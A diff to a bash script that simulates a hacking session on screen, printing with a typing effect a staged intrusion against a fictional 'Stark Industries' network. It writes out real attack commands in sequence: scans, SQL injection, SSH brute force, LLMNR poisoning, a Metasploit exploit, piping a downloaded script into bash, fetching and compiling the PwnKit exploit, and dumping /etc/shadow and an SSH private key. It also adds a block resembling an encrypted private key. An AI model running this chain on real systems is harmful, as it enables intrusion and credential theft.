@@ -15,8 +15,8 @@ BOLD='\033[1m'
 BLINK='\033[5m'
 
 # Target environment
-TARGET_CORP="QuantumSecure Industries"
-TARGET_DOMAIN="quantumsecure.corp"
+TARGET_CORP="Stark Industries"
+TARGET_DOMAIN="stark.corp"
 TARGET_IP="10.42.156.78"
 TARGET_IP2="10.42.156.92"
 DC_IP="10.42.156.10"
@@ -26,20 +26,33 @@ C2_SERVER="hxxps://dark-phoenix-c2[.]onion"
 OP_ID="GHOST_PROTOCOL_$(date +%s | tail -c 6)"
 
 # Timing configuration
-TYPE_SPEED=0.004
+TYPE_SPEED=0.02
 EXPLOIT_DELAY=0.05
 SCAN_DELAY=0.04
 
 # Realistic typing with character variation
-type_realistic() {
+type_text_clean() {
     local text="$1"
-    local speed="${2:-$TYPE_SPEED}"
-    for ((i=0; i<${#text}; i++)); do
-        echo -n "${text:$i:1}"
-        local delay=$(awk -v s=$speed 'BEGIN{srand(); print s + rand()*0.003}')
-        sleep $delay
+    local delay="$TYPE_SPEED"
+
+    # Process the string to separate escape codes from text
+    local processed=$(echo -e "$text")
+
+    echo -ne "$processed" | while IFS= read -r -d '' -n 1 char; do
+        # Check if this is part of escape sequence
+        if [[ "$char" == $'\033' ]]; then
+            # Read until we hit the letter that ends the sequence
+            echo -n "$char"
+            while IFS= read -r -d '' -n 1 char; do
+                echo -n "$char"
+                [[ "$char" =~ [a-zA-Z] ]] && break
+            done
+        else
+            echo -n "$char"
+            sleep $(awk -v d="$delay" 'BEGIN{srand(); print d + (rand() * d)}')
+        fi
     done
-    echo ""
+    echo
 }
 
 # Advanced progress bar with realistic speed variations
@@ -162,13 +175,9 @@ echo ""
 # ============================================================================
 # PHASE 1: OSINT & PASSIVE RECONNAISSANCE
 # ============================================================================
-echo -e "${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 1: OSINT & PASSIVE RECONNAISSANCE                      ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
-sleep 0.4
 
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} theHarvester -d ${TARGET_DOMAIN} -b all -l 500 -f ${OP_ID}_emails"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} theHarvester -d ${TARGET_DOMAIN} -b all -l 500 -f ${OP_ID}_emails"
 sleep 0.3
 spinner_anim "Harvesting public information from OSINT sources" 2
 echo ""
@@ -191,10 +200,10 @@ done
 sleep 0.3
 
 echo ""
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} subfinder -d ${TARGET_DOMAIN} -o subdomains.txt && cat subdomains.txt"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} subfinder -d ${TARGET_DOMAIN} -o subdomains.txt && cat subdomains.txt"
 sleep 0.3
-spinner_anim "Enumerating subdomains using passive DNS" 1.5
+spinner_anim "Enumerating subdomains using passive DNS" 2
 echo ""
 echo -e "${G}[+]${NC} ${W}Discovered Subdomains (18 total):${NC}"
 subdomains=("mail" "vpn" "portal" "intranet" "dev" "staging" "api" "cdn" "admin" "remote" "ftp" "git")
@@ -205,10 +214,10 @@ done
 sleep 0.3
 
 echo ""
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} shodan search 'org:\"${TARGET_CORP}\"' --fields ip_str,port,product,version"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} shodan search 'org:\"${TARGET_CORP}\"' --fields ip_str,port,product,version"
 sleep 0.3
-spinner_anim "Querying Shodan database for exposed services" 1.8
+spinner_anim "Querying Shodan database for exposed services" 2
 echo ""
 echo -e "${G}[+]${NC} ${W}Exposed Internet-Facing Services:${NC}"
 echo -e "${DIM}    IP              Port   Service           Banner${NC}"
@@ -220,16 +229,16 @@ echo -e "${W}    ${TARGET_IP}${NC}   ${Y}443${NC}    ${C}HTTPS${NC}           ${
 sleep 0.15
 echo -e "${W}    ${TARGET_IP2}${NC}  ${Y}3306${NC}   ${C}MySQL${NC}           ${GR}MySQL 8.0.28-0ubuntu${NC}"
 sleep 0.15
-echo -e "${W}    ${DC_IP}${NC}      ${Y}445${NC}    ${C}SMB${NC}             ${GR}Samba 4.13.17-Ubuntu${NC}"
+echo -e "${W}    ${DC_IP}${NC}   ${Y}445${NC}    ${C}SMB${NC}             ${GR}Samba 4.13.17-Ubuntu${NC}"
 sleep 0.15
-echo -e "${W}    ${DC_IP}${NC}      ${Y}389${NC}    ${C}LDAP${NC}            ${GR}Microsoft Active Directory${NC}"
+echo -e "${W}    ${DC_IP}${NC}   ${Y}389${NC}    ${C}LDAP${NC}            ${GR}Microsoft Active Directory${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} curl -s 'https://crt.sh/?q=%.${TARGET_DOMAIN}&output=json' | jq -r '.[].name_value' | sort -u"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/recon${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} curl -s 'https://crt.sh/?q=%.${TARGET_DOMAIN}&output=json' | jq -r '.[].name_value' | sort -u"
 sleep 0.3
-spinner_anim "Analyzing SSL certificate transparency logs" 1.3
+spinner_anim "Analyzing SSL certificate transparency logs" 1
 echo ""
 echo -e "${G}[+]${NC} ${W}SSL Certificates Found:${NC}"
 echo -e "${DIM}    ├──${NC} ${M}*.${TARGET_DOMAIN}${NC} ${GR}(Wildcard)${NC}"
@@ -241,13 +250,9 @@ sleep 0.4
 # ============================================================================
 # PHASE 2: ACTIVE NETWORK SCANNING
 # ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 2: ACTIVE NETWORK SCANNING & SERVICE ENUMERATION       ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
-sleep 0.4
 
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/scan${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} masscan ${INTERNAL_NET} -p1-65535 --rate=10000 --open-only"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/scan${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} masscan ${INTERNAL_NET} -p1-65535 --rate=10000 --open-only"
 sleep 0.3
 echo -e "${Y}[*]${NC} ${GR}Initiating high-speed port scan: ${W}65535${GR} ports across ${W}256${GR} hosts${NC}"
 echo -e "${Y}[*]${NC} ${GR}Scan rate: ${W}10,000${GR} packets/second${NC}"
@@ -266,8 +271,8 @@ echo -e "${G}[+]${NC} ${GR}Scan complete: ${W}247${GR} open ports found across $
 sleep 0.4
 
 echo ""
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/scan${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} nmap -sV -sC -O -A --script=vuln -p- ${TARGET_IP} -oA ${OP_ID}_nmap"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/scan${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} nmap -sV -sC -O -A --script=vuln -p- ${TARGET_IP} -oA ${OP_ID}_nmap"
 sleep 0.3
 spinner_anim "Running comprehensive vulnerability scan with NSE scripts" 3
 echo ""
@@ -309,8 +314,8 @@ echo -e "${G}[+]${NC} ${GR}Network Distance: ${W}13 hops${NC}"
 sleep 0.4
 
 echo ""
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/scan${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u https://${TARGET_IP}/FUZZ -mc 200,301,302,403 -t 200"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/scan${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u https://${TARGET_IP}/FUZZ -mc 200,301,302,403 -t 200"
 sleep 0.3
 progress_bar_advanced 1.5 "Fuzzing web directories and files..."
 echo ""
@@ -326,17 +331,14 @@ for path in "${paths[@]}"; do
     sleep 0.06
 done
 sleep 0.4
-
-# ============================================================================
-# PHASE 3: VULNERABILITY ASSESSMENT & ANALYSIS
-# ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 3: VULNERABILITY ASSESSMENT & EXPLOIT RESEARCH         ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
-sleep 0.4
-
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/vuln${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} nikto -h https://${TARGET_IP} -ssl -Format txt -output nikto_${OP_ID}.txt"
+#
+### ============================================================================
+### PHASE 3: VULNERABILITY ASSESSMENT & ANALYSIS
+### ============================================================================
+##sleep 0.4
+#
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/vuln${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} nikto -h https://${TARGET_IP} -ssl -Format txt -output nikto_${OP_ID}.txt"
 sleep 0.3
 spinner_anim "Running Nikto web vulnerability scanner" 2.5
 echo ""
@@ -350,8 +352,8 @@ echo -e "${R}    [6]${NC} ${GR}X-Powered-By header reveals: PHP/7.4.30${NC}"
 sleep 0.5
 
 echo ""
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/vuln${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} sqlmap -u \"https://${TARGET_IP}/api/users?id=1\" --batch --random-agent --level=5 --risk=3 --threads=10"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/vuln${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} sqlmap -u \"https://${TARGET_IP}/api/users?id=1\" --batch --random-agent --level=5 --risk=3 --threads=10"
 sleep 0.3
 echo -e "${Y}[*]${NC} ${GR}Testing parameter 'id' for SQL injection vulnerabilities...${NC}"
 progress_bar_advanced 2.0 "Performing deep SQL injection tests..."
@@ -366,7 +368,7 @@ echo -e "${R}[!]${NC} ${W}Additional injection points:${NC}"
 echo -e "${R}    ├──${NC} ${W}Time-based blind SQL injection${NC}"
 echo -e "${R}    └──${NC} ${W}UNION query SQL injection${NC}"
 sleep 0.5
-
+##
 echo ""
 echo -e "${G}[+]${NC} ${W}Database Information Retrieved:${NC}"
 echo -e "${GR}    Backend DBMS: ${W}MySQL >= 8.0${NC}"
@@ -375,8 +377,8 @@ echo -e "${GR}    Web application technology: ${W}nginx 1.18.0, PHP 7.4.30${NC}"
 sleep 0.4
 
 echo ""
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/vuln${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} searchsploit nginx 1.18 php 7.4 linux"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/vuln${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} searchsploit nginx 1.18 php 7.4 linux"
 sleep 0.3
 echo -e "${Y}[*]${NC} ${GR}Searching exploit database...${NC}"
 sleep 0.6
@@ -388,16 +390,12 @@ echo -e "${M}    ├──${NC} ${R}PHP 7.0 < 7.4 - 'filter_var' Command Injecti
 echo -e "${M}    └──${NC} ${R}Linux Kernel 5.4 - 'pkexec' Local Privilege Escalation (PwnKit)${NC} ${DIM}(2022-01-25)${NC}"
 sleep 0.5
 
-# ============================================================================
-# PHASE 4: CREDENTIAL HARVESTING
-# ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 4: CREDENTIAL HARVESTING & BRUTE FORCE                 ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
-sleep 0.4
+## ============================================================================
+## PHASE 4: CREDENTIAL HARVESTING
+## ============================================================================
 
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/creds${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ${TARGET_IP} ssh -t 4 -V"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/creds${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ${TARGET_IP} ssh -t 4 -V"
 sleep 0.3
 echo -e "${Y}[*]${NC} ${GR}Launching SSH brute force attack...${NC}"
 echo -e "${Y}[*]${NC} ${GR}Target: ${W}${TARGET_IP}:22${NC}"
@@ -413,19 +411,19 @@ for i in {1..25}; do
     sleep 0.05
 done
 
-echo -e "${G}[22][ssh]${NC} host: ${W}${TARGET_IP}${NC}   login: ${C}admin${NC}   password: ${R}Summer2024!${NC}"
+echo -e "${G}[22][ssh]${NC} host: ${W}${TARGET_IP}${NC}   login: ${C}admin${NC}   password: ${R}SummerOf69!${NC}"
 sleep 0.6
 
 echo ""
 echo -e "${G}[+]${NC} ${W}${BOLD}VALID CREDENTIALS FOUND${NC}"
 echo -e "${GR}    Username: ${C}admin${NC}"
-echo -e "${GR}    Password: ${R}Summer2024!${NC}"
+echo -e "${GR}    Password: ${R}SummerOf69!${NC}"
 echo -e "${GR}    Service: ${Y}SSH (Port 22)${NC}"
 sleep 0.5
 
 echo ""
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/creds${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} python3 responder.py -I eth0 -wrf -v"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/creds${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} python3 responder.py -I eth0 -wrf -v"
 sleep 0.3
 exploit_anim "Deploying LLMNR/NBT-NS/MDNS poisoning"
 echo -e "${R}[!]${NC} ${GR}Listening for NetBIOS/LLMNR authentication requests...${NC}"
@@ -441,8 +439,8 @@ done
 sleep 0.4
 
 echo ""
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/creds${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} hashcat -m 5600 -a 0 ntlmv2_hashes.txt rockyou.txt --force --opencl-device-types 1,2"
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/creds${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} hashcat -m 5600 -a 0 ntlmv2_hashes.txt rockyou.txt --force --opencl-device-types 1,2"
 sleep 0.3
 echo -e "${Y}[*]${NC} ${GR}Initializing GPU-accelerated hash cracking...${NC}"
 sleep 0.4
@@ -456,22 +454,19 @@ echo -e "${G}[+]${NC} ${W}Hash Cracked:${NC} ${C}jsmith${NC}:${R}Winter2024Pass!
 echo -e "${G}[+]${NC} ${W}Hash Cracked:${NC} ${C}mbrown${NC}:${R}MyP@ssw0rd123${NC}"
 sleep 0.5
 
-# ============================================================================
-# PHASE 5: INITIAL ACCESS & EXPLOITATION
-# ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 5: INITIAL ACCESS & REMOTE CODE EXECUTION              ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
+## ============================================================================
+## PHASE 5: INITIAL ACCESS & EXPLOITATION
+## ============================================================================
 sleep 0.4
 
-echo -e "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/exploit${GR}]${NC}"
-echo -e "${GR}└─${R}\$${NC} msfconsole -q -x \"use exploit/multi/http/php_cgi_arg_injection; set RHOSTS ${TARGET_IP}; set LHOST ${ATTACKER_IP}; exploit\""
+echo -ne "${GR}┌──(${R}ghost${GR}@${R}kali${GR})-[${B}~/exploit${GR}]${NC}"
+type_text_clean "${GR}└─${R}\$${NC} msfconsole -q -x \"use exploit/multi/http/php_cgi_arg_injection; set RHOSTS ${TARGET_IP}; set LHOST ${ATTACKER_IP}; exploit\""
 sleep 0.6
 echo ""
 echo -e "${R}${BOLD}       =[ metasploit v6.3.55-dev-8f1e6b3                  ]${NC}"
 echo -e "${R}+ -- --=[ 2397 exploits - 1235 auxiliary - 413 post       ]${NC}"
 echo -e "${R}+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]${NC}"
-echo -e "${R}+ -- --=[ 14 evasion                                       ]${NC}"
+echo -e "${R}+ -- --=[ 14 evasion                                      ]${NC}"
 sleep 0.5
 
 echo ""
@@ -518,12 +513,11 @@ sleep 0.6
 # ============================================================================
 # PHASE 6: POST-EXPLOITATION & SYSTEM ENUMERATION
 # ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 6: POST-EXPLOITATION & SYSTEM ENUMERATION              ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
+
 sleep 0.4
 
-echo -e "${R}meterpreter >${NC} ${DIM}sysinfo${NC}"
+echo -ne "${R}meterpreter >${NC}"
+type_text_clean "${DIM}sysinfo${NC}"
 sleep 0.3
 echo -e "${GR}Computer        : web-prod-01${NC}"
 echo -e "${GR}OS              : Linux web-prod-01 5.4.0-126-generic #142-Ubuntu SMP x86_64${NC}"
@@ -535,13 +529,15 @@ echo -e "${GR}Meterpreter     : php/linux${NC}"
 sleep 0.4
 
 echo ""
-echo -e "${R}meterpreter >${NC} ${DIM}getuid${NC}"
+echo -ne "${R}meterpreter >${NC}"
+type_text_clean "${DIM}getuid${NC}"
 sleep 0.3
 echo -e "${Y}Server username: www-data (33)${NC}"
 sleep 0.3
 
 echo ""
-echo -e "${R}meterpreter >${NC} ${DIM}ps${NC}"
+echo -ne "${R}meterpreter >${NC}"
+type_text_clean "${DIM}ps${NC}"
 sleep 0.3
 echo -e "${GR}Process List${NC}"
 echo -e "${GR}============${NC}\n"
@@ -557,28 +553,33 @@ echo -e " 4567   admin        bash"
 sleep 0.4
 
 echo ""
-echo -e "${R}meterpreter >${NC} ${DIM}shell${NC}"
+echo -ne "${R}meterpreter >${NC}"
+type_text_clean "${DIM}shell${NC}"
 sleep 0.3
 echo -e "${G}[+]${NC} ${GR}Opening system shell...${NC}"
 sleep 0.4
-
+#
 echo ""
-echo -e "${C}www-data@web-prod-01${GR}:${B}/var/www/html${GR}\$${NC} ${DIM}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'${NC}"
+echo -ne "${C}www-data@web-prod-01${GR}:${B}/var/www/html"
+type_text_clean "${GR}\$${NC} ${DIM}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'${NC}"
 sleep 0.4
-echo -e "${C}www-data@web-prod-01${GR}:${B}/var/www/html${GR}\$${NC} ${DIM}whoami && id${NC}"
+echo -ne "${C}www-data@web-prod-01${GR}:${B}/var/www/html"
+type_text_clean "${GR}\$${NC} ${DIM}whoami && id${NC}"
 sleep 0.3
 echo "www-data"
 echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
 sleep 0.3
 
 echo ""
-echo -e "${C}www-data@web-prod-01${GR}:${B}/var/www/html${GR}\$${NC} ${DIM}uname -a${NC}"
+echo -ne "${C}www-data@web-prod-01${GR}:${B}/var/www/html"
+type_text_clean "${GR}\$${NC} ${DIM}uname -a${NC}"
 sleep 0.3
 echo "Linux web-prod-01 5.4.0-126-generic #142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux"
 sleep 0.4
-
+#
 echo ""
-echo -e "${C}www-data@web-prod-01${GR}:${B}/var/www/html${GR}\$${NC} ${DIM}cat /etc/passwd | grep -E 'bash\$|sh\$'${NC}"
+echo -ne "${C}www-data@web-prod-01${GR}:${B}/var/www/html"
+type_text_clean "${GR}\$${NC} ${DIM}cat /etc/passwd | grep -E 'bash\$|sh\$'${NC}"
 sleep 0.3
 echo "root:x:0:0:root:/root:/bin/bash"
 echo "admin:x:1001:1001::/home/admin:/bin/bash"
@@ -589,14 +590,11 @@ sleep 0.4
 # ============================================================================
 # PHASE 7: PRIVILEGE ESCALATION
 # ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 7: PRIVILEGE ESCALATION TO ROOT                        ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
 sleep 0.4
-
-echo -e "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC} ${DIM}curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash${NC}"
+echo -ne "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC}"
+type_text_clean "${DIM}curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash${NC}"
 sleep 0.3
-spinner_anim "Running LinPEAS privilege escalation enumeration" 2.5
+spinner_anim "Running LinPEAS privilege escalation enumeration" 3
 echo ""
 echo -e "${R}╔══════════╣${NC} ${W}Checking SUID binaries${NC}"
 echo -e "${DIM}-rwsr-xr-x 1 root root  85064 Jul 14  2022 ${R}/usr/bin/pkexec ${Y}(CVE-2021-4034 - PwnKit)${NC}"
@@ -626,7 +624,8 @@ echo -e "${Y}/root/.bash_history ${G}(Readable!)${NC}"
 sleep 0.4
 
 echo ""
-echo -e "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC} ${DIM}cat /var/www/html/.env${NC}"
+echo -ne "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC}"
+type_text_clean "${DIM}cat /var/www/html/.env${NC}"
 sleep 0.3
 echo -e "${Y}DB_HOST${NC}=10.42.156.92"
 echo -e "${Y}DB_DATABASE${NC}=quantumsecure_prod"
@@ -637,13 +636,17 @@ sleep 0.4
 echo ""
 echo -e "${G}[+]${NC} ${W}Exploiting pkexec SUID binary (CVE-2021-4034 PwnKit)${NC}"
 echo ""
-echo -e "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC} ${DIM}wget https://github.com/arthepsy/CVE-2021-4034/raw/main/cve-2021-4034.c${NC}"
+echo -ne "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC}"
+type_text_clean "${DIM}wget https://github.com/arthepsy/CVE-2021-4034/raw/main/cve-2021-4034.c${NC}"
 sleep 0.4
-echo -e "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC} ${DIM}gcc cve-2021-4034.c -o exploit${NC}"
+echo -ne "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC}"
+type_text_clean "${DIM}gcc cve-2021-4034.c -o exploit${NC}"
 sleep 0.4
-echo -e "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC} ${DIM}chmod +x exploit${NC}"
+echo -ne "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC}"
+type_text_clean "${DIM}chmod +x exploit${NC}"
 sleep 0.3
-echo -e "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC} ${DIM}./exploit${NC}"
+echo -ne "${C}www-data@web-prod-01${GR}:${B}/tmp${GR}\$${NC}"
+type_text_clean "${DIM}./exploit${NC}"
 sleep 0.5
 exploit_anim "Triggering PwnKit memory corruption exploit"
 echo ""
@@ -651,21 +654,20 @@ echo -e "${G}[+]${NC} ${W}${BOLD}ROOT SHELL OBTAINED!${NC}"
 sleep 0.5
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/tmp${GR}#${NC} ${DIM}whoami && id${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}whoami && id${NC}"
 sleep 0.3
 echo "root"
 echo "uid=0(root) gid=0(root) groups=0(root)"
 sleep 0.4
 
-# ============================================================================
-# PHASE 8: CREDENTIAL DUMPING
-# ============================================================================
-echo -e "\n${C}${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${C}${BOLD}║  PHASE 8: CREDENTIAL DUMPING & LATERAL MOVEMENT PREP          ║${NC}"
-echo -e "${C}${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
+## ============================================================================
+## PHASE 8: CREDENTIAL DUMPING
+## ============================================================================
 sleep 0.4
 
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}cat /etc/shadow | grep -v '*' | grep -v '!' | head -5${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}cat /etc/shadow | grep -v '*' | grep -v '!' | head -5${NC}"
 sleep 0.3
 echo -e "${GR}root:\$6\$rounds=5000\$EFGHijklmnop\$encrypted.hash.data.here.long.string:19456:0:99999:7:::${NC}"
 echo -e "${GR}admin:\$6\$8xK9pL2m\$another.encrypted.hash.string.data.long.format:19456:0:99999:7:::${NC}"
@@ -673,7 +675,8 @@ echo -e "${GR}jsmith:\$6\$vNz7HpQr\$yet.another.hash.value.encrypted.data.string
 sleep 0.4
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}cat ~/.bash_history | grep -iE 'ssh|password|mysql|sudo'${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}cat ~/.bash_history | grep -iE 'ssh|password|mysql|sudo'${NC}"
 sleep 0.3
 echo -e "${GR}mysql -u db_admin -p'Db!S3cur3P@ss2024' -h ${TARGET_IP2}${NC}"
 echo -e "${GR}ssh admin@${DC_IP}${NC}"
@@ -682,7 +685,8 @@ echo -e "${GR}echo 'Admin@Quantum2024!' | sudo -S apt update${NC}"
 sleep 0.4
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}find /home -type f -name '*.txt' -o -name '*.conf' -o -name 'id_rsa' 2>/dev/null | head -8${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}find /home -type f -name '*.txt' -o -name '*.conf' -o -name 'id_rsa' 2>/dev/null | head -8${NC}"
 sleep 0.4
 echo "/home/admin/.ssh/id_rsa"
 echo "/home/admin/notes.txt"
@@ -692,12 +696,24 @@ echo "/home/backup/.mysql_history"
 sleep 0.3
 
 echo ""
-echo -e "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC} ${DIM}cat /home/admin/.ssh/id_rsa${NC}"
+echo -ne "${R}root@web-prod-01${GR}:${B}/root${GR}#${NC}"
+type_text_clean "${DIM}cat /home/admin/.ssh/id_rsa${NC}"
 sleep 0.3
 echo "-----BEGIN OPENSSH PRIVATE KEY-----"
-echo "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn"
-echo "NhAAAAAwEAAQAAAYEAw9K8Qx7J5mH3pN8vL2kW4fR7tY8uE9xC3pQ7mN6vK8rL3sT9uW5v"
-echo "... [truncated for display] ..."
+echo "b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABC6qaBfHT"
+echo "HmQuxY3Bas6CrnAAAAEAAAAAEAAAEVAAAAB3NzaC1yc2EAAAABIwAAAQEAvsfgBxrRrXtT"
+echo "K6NlFboYvw/1t+BWn27OuykQzGkChEFch4ai8r9aHBtRSPx65cSvlgTMKhbBuyApZTan9J"
+echo "P3mukwzyryZWupGnR3cXyapJTFoPlk3McLPeBTzZdv5cqIobEKyyqZNPztubpGPQ9CH//h"
+echo "rYGh6rxHX35HoBcKTGao8mniXdC9mjDXxL6ZlOchlIx+QLgk8IZqLPHVlFD7ZY1NS4h+7c"
+echo "xKDTlvci+5ylA2uYxS8tF8AQu3n8y7pensbwFWZYjhxpq+4Ft3ZTctcwVbt2Ld/ne5uMET"
+echo "jrswejJney8pIPQz59FrEriHqdvJyFslbP0MGsA6cKLow7tKaQAAA8C4x8brtTC618rLBT"
+echo "bh4pg8uUEZcXC/XxR5lCOXWpm4lREvkNzIIZx4zODnHwi+ufIk6Ul41pAizmgkSMwVW0UO"
+echo "hNMAVGgrV/wV866XC4RvBQkb5magBWjjOkmpwf3t3+/iI+7BfxAlsGK3rHLT7/rZ04km2V"
+echo "DpGlK9STAEs7NlJ4AQxQAcXqFOzFxkZ0Rba5aqKzVy28WIFgFnwl1xkHYqR61xSTn6UCVy"
+echo "JAdhftais5YGuPjQXcSyIxjgGl1vxCdAqzjSyNTsy+ztjE5522Bdn+plk1Hw2Ik7g56rNX"
+echo "fpm9JNt1XgARV8xHenOW22zmXdJE6klNXQ17pfka+pod+8sxekH0K6MqlEfPXoHG/CfksW"
